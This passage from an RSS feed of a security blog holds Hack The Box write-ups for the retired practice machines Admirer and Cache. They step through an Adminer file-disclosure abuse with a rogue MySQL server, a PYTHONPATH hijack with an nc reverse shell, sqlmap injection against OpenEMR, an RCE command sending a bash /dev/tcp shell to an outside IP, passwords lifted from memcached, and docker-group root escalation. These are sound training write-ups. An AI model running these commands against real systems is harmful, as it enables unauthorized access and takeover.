</code></pre><p>After some googling, I realised that the &quot;better open source alternative&quot; to database administration is likely the <a href="https://www.adminer.org/">Adminer</a> tool - the name likeness was a dead giveaway. </p><p>And this brings us to the <a href="http://10.10.10.187/utility-scripts/adminer.php">adminer.php</a> page:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login.png" class="kg-image" alt="HTB Write-up | Admirer" loading="lazy"></figure><hr><h2 id="exploiting-adminer">Exploiting Adminer</h2><p>After trying (and failing) to login with all of the credentials previously found, I decided to search for Adminer vulnerabilities. </p><p>Turns out <a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability ">Adminer 4.6.2 is vulnerable to a file disclosure vulnerability</a>.</p><p>So I installed and launched an instance of mySQL server on my machine and then <strong>added a new local user</strong> that can access this mySQL server from the admirer.htb host using the password &apos;password&apos;:</p><!--kg-card-begin: markdown--><pre><code>~ /usr/local/mysql/bin/mysql -u root -p
Enter password:
...

mysql&gt; create user &apos;waldo&apos;@&apos;10.10.10.187&apos; IDENTIFIED WITH mysql_native_password  BY &apos;password&apos;;
Query OK, 0 rows affected (0.01 sec)

mysql&gt; select user, host from mysql.user;
+------------------+--------------+
| user             | host         |
+------------------+--------------+
| waldo            | 10.10.10.187 |
| mysql.infoschema | localhost    |
| mysql.session    | localhost    |
| mysql.sys        | localhost    |
| root             | localhost    |
+------------------+--------------+
5 rows in set (0.00 sec)
</code></pre>
<!--kg-card-end: markdown--><p>In order to get this to work I had to add some additional configuration to my server (&apos;/etc/my.cnf&apos;):</p><!--kg-card-begin: markdown--><pre><code>[mysqld]
default_authentication_plugin  =  mysql_native_password
local-infile                   = 1
</code></pre>
<!--kg-card-end: markdown--><p>Note that the <a href="https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_local_infile">local-infile</a> variable should be set to true as to allow us to load data from local files into the DB, which we&apos;ll need in a following step.</p><p>Once this is done, we can login as our new user from the Adminer client with password &apos;password&apos;. Note that the server IP should correspond to the IP where you setup the MySQL server and that you need to specify the port if it&apos;s not the default (3306).</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-4.png" class="kg-image" alt="HTB Write-up | Admirer" loading="lazy"></figure><p>After logging into the system, we can access the SQL interface and can send commands directly to the machine. </p><p><strong>Our goal is to load local files from the admirer.htb machine to a new DB in our local mySQL server. </strong></p><p>So, first things first, we need to create a valid db with a table that will receive the data. Note that this table should have a field that should support big lines of text content.</p><!--kg-card-begin: markdown--><pre><code>mysql&gt; create database test;

mysql&gt; use test;
Database changed

mysql&gt; create table tt (line varchar(1000));
Query OK, 0 rows affected (0.01 sec)
</code></pre>
<!--kg-card-end: markdown--><p>Also, you need to grant permission for your user to be able to access that data: </p><!--kg-card-begin: markdown--><pre><code>mysql&gt; grant all privileges on test.tt to &apos;waldo&apos;@&apos;10.10.10.187&apos;;
Query OK, 0 rows affected (0.04 sec)
</code></pre>
<!--kg-card-end: markdown--><p>Going back to our SQL interface, the files most likely to contain valid credentials are index.php and db_admin.php, where we previously found outdated DB credentials.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/query.png" class="kg-image" alt="HTB Write-up | Admirer" loading="lazy"></figure><p>To see the results we can either access the data directly on the SQL interface or go to our mySQL server and query the data.</p><!--kg-card-begin: markdown--><pre><code>~ select line from test.tt;

...
$servername = &quot;localhost&quot;;
$username = &quot;waldo&quot;;
$password = &quot;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&quot;;
$dbname = &quot;admirerdb&quot;;
...
</code></pre>
<!--kg-card-end: markdown--><p>Finally, we have credentials for the admirerdb database and as it turns out waldo&apos;s SSH credentials:</p><!--kg-card-begin: markdown--><pre><code>ssh waldo@10.10.10.187
waldo@10.10.10.187&apos;s password:
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Jun  8 21:25:38 2020 from 10.10.14.95
waldo@admirer:~$ 
</code></pre>
<!--kg-card-end: markdown--><h3 id="useful-resources">Useful Resources</h3><ul><li><a href="https://www.dev2qa.com/how-to-use-mysql-on-mac/">https://www.dev2qa.com/how-to-use-mysql-on-mac/</a></li><li><a href="https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py">https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a></li><li><a href="https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html">https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html</a></li><li><a href="https://stackoverflow.com/questions/14779104/how-to-allow-remote-connection-to-mysql">https://stackoverflow.com/questions/14779104/how-to-allow-remote-connection-to-mysql</a></li></ul><hr><h2 id="privilege-escalation">Privilege Escalation</h2><p>Now authenticated as <code>waldo</code>, we started by running <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a>, which helped us find some interesting stuff:</p><!--kg-card-begin: markdown--><pre><code>[+] Readable files belonging to root and readable by me but not world readable
-rwxr----- 1 root admins 198 Dec  2  2019 /opt/scripts/backup.py
</code></pre>
<!--kg-card-end: markdown--><p>On the <code>/opt/scripts/</code> directory we find the <code>admin_tasks</code> bash script which is called by the administrative interface we previously saw. </p><p>At first glance there wasn&apos;t any obvious way to exploit this script but, as you can see below, there is a &quot;Backup web data&quot; option which executes the <code>backup.py</code> script as root.</p><!--kg-card-begin: markdown--><pre><code>...
backup_web()
{
    if [ &quot;$EUID&quot; -eq 0 ]
    then
        echo &quot;Running backup script in the background, it might take a while...&quot;
        /opt/scripts/backup.py &amp;
    else
        echo &quot;Insufficient privileges to perform the selected operation.&quot;
    fi
}
...
</code></pre>
<!--kg-card-end: markdown--><p>The <code>backup.py</code> file, on the other hand, imports the <code>make_archive</code> binary from <code>shutil</code>, which we might be able to exploit by changing the path in which the Python script is executed.</p><!--kg-card-begin: markdown--><pre><code>!/usr/bin/python3

from shutil import make_archive

src = &apos;/var/www/html/&apos;

old ftp directory, not used anymore
dst = &apos;/srv/ftp/html&apos;

dst = &apos;/var/backups/html&apos;

make_archive(dst, &apos;gztar&apos;, src)
</code></pre>
<!--kg-card-end: markdown--><p>So, we need to:</p><ul><li>change the <strong>Python path</strong> to start with a directory that we control, e.g.: /home/waldo/.abc/;</li><li>create a <strong>shutil.py</strong> file inside /home/waldo/.abc/;</li><li>add a <strong>make_archive</strong> function to shutil.py that uses the same signature (3 fields) but instead of archiving the web content returns a shell as root;</li></ul><p>Let&apos;s start with our mock <code>shutil.py</code>:</p><!--kg-card-begin: markdown--><pre><code>waldo@admirer:~$ nano /home/waldo/.abc/shutil.py

import os

def make_archive(a, b, c):
    os.system(&quot;nc [attacker_ip] [attacker_port] -e &apos;/bin/sh&apos;&quot;)
    
waldo@admirer:~$ chmod +x /home/waldo/.abc/shutil.py
</code></pre>
<!--kg-card-end: markdown--><p>Don&apos;t forget to create a listener on the port you specify above:</p><!--kg-card-begin: markdown--><p><code>nc -l [PORT]</code></p>
<!--kg-card-end: markdown--><p>Now, all we need to do is change the python path on the call for the admin_tasks script:</p><!--kg-card-begin: markdown--><pre><code>waldo@admirer:~$ sudo PYTHONPATH=/home/waldo/.abc/ /opt/scripts/admin_tasks.sh

[sudo] password for waldo: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
</code></pre>
<!--kg-card-end: markdown--><p>And we receive a shell as root which allows us to print the root flag!</p><p>Hope you enjoyed it :)</p><hr>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Cache]]></title><description><![CDATA[Write-up for Cache, a retired HTB machine.]]></description><link>https://inesmartins.github.io//htb-write-up-cache/</link><guid isPermaLink="false">5ede7316b6ef324dc7275f74</guid><category><![CDATA[htb]]></category><category><![CDATA[linux]]></category><category><![CDATA[cache]]></category><category><![CDATA[memcached]]></category><category><![CDATA[privesc]]></category><category><![CDATA[docker]]></category><category><![CDATA[openemr]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 08:51:40 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/10/cache.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/10/cache.png" alt="HTB Write-up | Cache"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/251">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>We start with our usual scanning which finds only an instance of <code>OpenSSH</code> running on port 22 and an <code>Apache</code> server running on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ sudo nmap -sV -sC -A -T4 cache.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 18:21 WEST
Nmap scan report for cache.htb (10.10.10.188)
Host is up (0.042s latency).
Not shown: 998 closed ports

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
</code></pre>
<!--kg-card-end: markdown--><p>The website hosted on <code>cache.htb</code> is very simple: there are only a couple of HTML pages with some text about hacking.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/index.png" class="kg-image" alt="HTB Write-up | Cache" loading="lazy"></figure><p>There&apos;s also a very simple <a href="http://cache.htb/login.html">Login page</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-2.png" class="kg-image" alt="HTB Write-up | Cache" loading="lazy"></figure><p>The credentials for this authentication form are hardcoded on a <a href="http://cache.htb/jquery/functionality.js">JS file</a>:</p><!--kg-card-begin: markdown--><pre><code>user: ash
password: H@v3_fun
</code></pre>
<!--kg-card-end: markdown--><p>Using these credentials on the form we&apos;re redirected to the <a href="http://cache.htb/net.html">Net page</a>, which doesn&apos;t seem to have anything of relevance.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/net.png" class="kg-image" alt="HTB Write-up | Cache" loading="lazy"></figure><p>The <a href="http://cache.htb/author.html">Author page</a>, on the other hand, seems to have some interesting information:</p><pre><code class="language-html">&lt;div class=&quot;card&quot;&gt;
  &lt;img src=&quot;logo1.jpg&quot; alt=&quot;John&quot; style=&quot;width:100%&quot;&gt;
  &lt;h1&gt;ASH&lt;/h1&gt;
  &lt;p class=&quot;title&quot;&gt;CEO &amp; Founder, CACHE&lt;/p&gt;
  &lt;a href=&quot;http://cache.htb&quot;&gt;cache.htb&lt;/a&gt;
  &lt;h3&gt;&lt;font color=&quot;Grey&quot;&gt;ASH is a Security Researcher (Threat Research Labs), Security Engineer. Hacker, Penetration Tester and Security blogger. He is Editor-in-Chief, Author &amp; Creator of Cache. Check out his other projects like Cache:&lt;p&gt; HMS(Hospital Management System)
&lt;/font&gt;&lt;/h3&gt; </code></pre><p>So, a couple of interesting things:</p><ul><li>the CEO and Founder of CACHE is someone named ASH (also maybe John according to the alt tag);</li><li>ASH is also the creator of another project called HMS;</li></ul><p>I was certain that HMS was an important clue, but wasn&apos;t completely sure how to access it, until I realised that it was an alternative <a href="https://httpd.apache.org/docs/2.4/vhosts/examples.html">virtual host</a>.<strong> </strong>So, in order to display this other website, all we have to do is change our <code>/etc/hosts</code> configuration:</p><!--kg-card-begin: markdown--><pre><code>10.10.10.188 hms.htb
</code></pre>
<!--kg-card-end: markdown--><hr><h2 id="exploiting-openemr-vulnerabilities">Exploiting OpenEMR Vulnerabilities</h2><p>When we access <a href="http://hms.htb/">hms.htb</a> we&apos;re redirected to a <a href="http://hms.htb/interface/login/login.php?site=default">login page</a> for <a href="https://www.open-emr.org/">OpenEMR</a>, which is an &quot;open source electronic health records and medical practice management solution&quot;.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-3.png" class="kg-image" alt="HTB Write-up | Cache" loading="lazy"></figure><p>Turns out OpenEMR has a lot of well-known vulnerabilities, which are very thoroughly detailed <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">here</a>.</p><p>As indicated on these docs, we can check the <a href="http://hms.htb/admin.php">admin.php</a> file for the exact version of the application:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/vulns.png" class="kg-image" alt="HTB Write-up | Cache" loading="lazy"></figure><p>This version is vulnerable to multiple SQL Injection vulnerabilities. There&apos;s actually a very good <a href="https://www.youtube.com/watch?time_continue=115&amp;v=DJSQ8Pk_7hc&amp;feature=emb_logo">video tutorial</a> for this exploit, but in very simple terms it works as follows:</p><ol><li>capture the GET request to a <a href="http://hms.htb/portal/add_edit_event_user.php">portal page</a> with <a href="https://portswigger.net/burp">Burp</a> or any other proxy;</li><li>copy that request to a file and then add a parameter (?eid=1) to the URL:</li></ol><!--kg-card-begin: markdown--><pre><code>~ sudo nano openemr.req

GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
Host: hms.htb
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,pt-PT;q=0.8,pt;q=0.7
Cookie: OpenEMR=ektggh73sf93fg6kg9ctif9km6; PHPSESSID=mff3bosse1qitlik842hl4ud4f
Connection: close
</code></pre>
<!--kg-card-end: markdown--><p>3. use <a href="http://sqlmap.org/">sqlmap</a> to exploit the aforementioned SQL injection vulnerabilities, starting with the enumeration of the available databases:</p><!--kg-card-begin: markdown--><pre><code>~ sqlmap -r openemr.req --threads=10 --dbs

available databases [2]:
[*] information_schema
[*] openemr
</code></pre>
<!--kg-card-end: markdown--><p>4. once we have the database name, dump the contents of the <strong>users_secure</strong> table, which holds user info including passwords:</p><!--kg-card-begin: markdown--><pre><code>~ sqlmap -r openemr.req --threads=10 -D openemr -T users_secure --dump
</code></pre>
<!--kg-card-end: markdown--><p>And voil&#xE0;!<br>The users_secure table has only one user - <strong>openemr_admin</strong> - and now we know their hashed password, which we&apos;ll crack using john:</p><!--kg-card-begin: markdown--><pre><code>$ john -w=rockyou.txt hash.txt 
</code></pre>
<!--kg-card-end: markdown--><p>Now that we have a valid user/password combination, we can use <a href="https://www.exploit-db.com/exploits/45161">this script</a> to help us get the RCE (it took a bit of tweaking to get the script to work, since the base64 encoding was not working properly):</p><!--kg-card-begin: markdown--><pre><code>~ python3 openemr_rce.py http://hms.htb -u openemr_admin -p xxxxxx -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.43/4444 0&gt;&amp;1&quot;
</code></pre>
<!--kg-card-end: markdown--><hr><h2 id="getting-user">Getting user</h2><p>As always, we check the <code>/etc/passwd</code> file to check the system&apos;s users:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:/$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
ash:x:1000:1000:ash:/home/ash:/bin/bash
luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
</code></pre>
<!--kg-card-end: markdown--><p>There are 2 interesting users: <strong>ash</strong> and <strong>luffy</strong>:</p><ul><li>ash we already know - they&apos;re the CEO of both Cache and HMS. </li><li>luffy, however, means nothing to us at this point (but this is the name of a <a href="https://en.wikipedia.org/wiki/One_Piece">OnePiece</a> character, which combined with the image on the <a href="http://10.10.10.188/net.html">Net page</a> page might be a little clue).</li></ul><hr><h3 id="using-su">Using su</h3><p>We now have a couple of credentials that we want to test for both ash and luffy, however when we try to use <code>su</code>, we get the following error message:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:/var/www/hms.htb/public_html$ su -u ash
su -u ash
su: must be run from a terminal
</code></pre>
<!--kg-card-end: markdown--><p>After some Googling I realised that this means this machine is running inside a<a href="https://www.docker.com/"> </a>container. <a href="https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal">This StackOverflow answer</a> helped me go around it by using a <a href="https://netsec.ws/?p=337">TTY shell</a>:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:$ echo &quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot; &gt; /tmp/abc.py
www-data@cache:$ python3 /tmp/abc.py
www-data@cache:$ rm /tmp/abc.py
www-data@cache:$ su - ash
Password: H@v3_fun
ash@cache:~$ 
</code></pre>
<!--kg-card-end: markdown--><hr><h2 id="becoming-luffy">Becoming luffy</h2><p>From our initial enumeration we know that luffy is a member of the <code>docker</code> group, so it&apos;s likely that we first need to become luffy before being able to escalate to root.</p><p>So, we start by checking all the services running on the machine:</p><!--kg-card-begin: markdown--><pre><code>ash@cache:~/$ service --status-all

 [ - ]  acpid
 [ + ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  docker
 [ + ]  ebtables
 [ + ]  grub-common
 [ - ]  hwclock.sh
 [ + ]  irqbalance
 [ + ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ + ]  lvm2-lvmetad
 [ + ]  lvm2-lvmpolld
 [ + ]  lxcfs
 [ - ]  lxd
 [ - ]  mdadm
 [ - ]  mdadm-waitidle
 [ + ]  memcached
 [ + ]  mysql
 [ - ]  open-iscsi
 [ + ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ + ]  unattended-upgrades
 [ - ]  uuidd
</code></pre>
<!--kg-card-end: markdown--><p>Because of the name of the machine I decided to start by checking out the process in which <a href="https://memcached.org/">memcached</a> is running:</p><!--kg-card-begin: markdown--><pre><code>ash@cache:~$ ps aux | grep memcached

memcache   961  0.0  0.0 425792  4032 ?        Ssl  14:07   0:02 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
ash       7525  0.0  0.0 416308  2480 pts/5    Sl+  16:25   0:00 memcached
ash       8590  0.0  0.0  13136  1048 pts/6    S+   16:27   0:00 grep --color=auto memcached
</code></pre>
<!--kg-card-end: markdown--><blockquote>Memcached is an in-memory key-value store for small chunks of arbitrary data (strings, objects) from results of database calls, API calls, or page rendering. (...) [It&apos;s] intended for use in speeding up dynamic web applications by alleviating database load. [<a href="https://memcached.org/">Source</a>]</blockquote><p>Now that we know the port this service is using, let&apos;s see if there&apos;s anything useful cached on the server:</p><!--kg-card-begin: markdown--><pre><code>ash@cache:~$ nc 127.0.0.1 11211
nc 127.0.0.1 11211
stats items
stats items
STAT items:1:number 5
STAT items:1:number_hot 0
STAT items:1:number_warm 0
STAT items:1:number_cold 5
STAT items:1:age_hot 0
STAT items:1:age_warm 0
STAT items:1:age 20
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:evicted_active 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 72
STAT items:1:lrutail_reflocked 0
STAT items:1:moves_to_cold 895
STAT items:1:moves_to_warm 0
STAT items:1:moves_within_lru 0
STAT items:1:direct_reclaims 0
STAT items:1:hits_to_hot 0
STAT items:1:hits_to_warm 0
STAT items:1:hits_to_cold 2
STAT items:1:hits_to_temp 0
END
</code></pre>
<!--kg-card-end: markdown--><p>We know there&apos;s only 1 item, let&apos;s see what it contains:</p><!--kg-card-begin: markdown--><pre><code>stats cachedump 1 1000
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END
```</code></pre>
<!--kg-card-end: markdown--><p>Seems very interesting, let&apos;s print the values:</p><!--kg-card-begin: markdown--><pre><code>get user
get user
VALUE user 0 5
luffy
END

get passwd
get passwd
VALUE passwd 0 9
0n3_p1ec3
END
</code></pre>
<!--kg-card-end: markdown--><p>And there we go! We&apos;re now luffy!</p><hr><h2 id="getting-root">Getting root</h2><p>Knowing that luffy is a part of the docker group we only need a bit of googling to find a potential priv esc path:</p><blockquote>The problem arises when the docker group is assigned to the host user. Since docker is running as root with SGID, an unauthorised person who has access to the host user (with user privileges) can easily escalate privileges by mounting the host volume to one of the containers; granting the attacker full access to the filesystem. [<a href="https://root4loot.com/post/docker-privilege-escalation/">Source</a>]</blockquote><p>So, as specified on the article, we start by listing the available containers:</p><!--kg-card-begin: markdown--><pre><code>luffy@cache:~$ docker container ps
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>CONTAINER ID</th>
<th>IMAGE</th>
<th>COMMAND</th>
<th>CREATED</th>
<th>STATUS</th>
<th>PORTS</th>
<th>NAMES</th>
</tr>
</thead>
<tbody>
<tr>
<td>9c0e13e441d3</td>
<td>ubuntu</td>
<td>&quot;chroot /mnt sh&quot;</td>
<td>36 minutes ago</td>
<td>Up 36 minutes</td>
<td></td>
<td>relaxed_ishizaka</td>
</tr>
<tr>
<td>be4e9f712cb2</td>
<td>ubuntu</td>
<td>&quot;chroot /mnt sh&quot;</td>
<td>4 hours ago</td>
<td>Up 4 hours</td>
<td></td>
<td>heuristic_pasteur</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>There&apos;s only 1 image we can run: <strong>ubuntu</strong>. Now we can mount our machine&apos;s entire filesystem on a new container (by specifying the <code>-v</code> argument) and then spawn a TTY to access it.</p><!--kg-card-begin: markdown--><pre><code>luffy@cache:~$ docker run -v /:/mnt/root -ti ubuntu
</code></pre>
<!--kg-card-end: markdown--><p>Since we&apos;re root, we can print the root flag from its relative path to the mount point.</p><!--kg-card-begin: markdown--><pre><code>root@a5d39b0a924a:/# cat /mnt/root/root/root.txtcat 
</code></pre>
<!--kg-card-end: markdown--><hr>]]></content:encoded></item></channel></rss>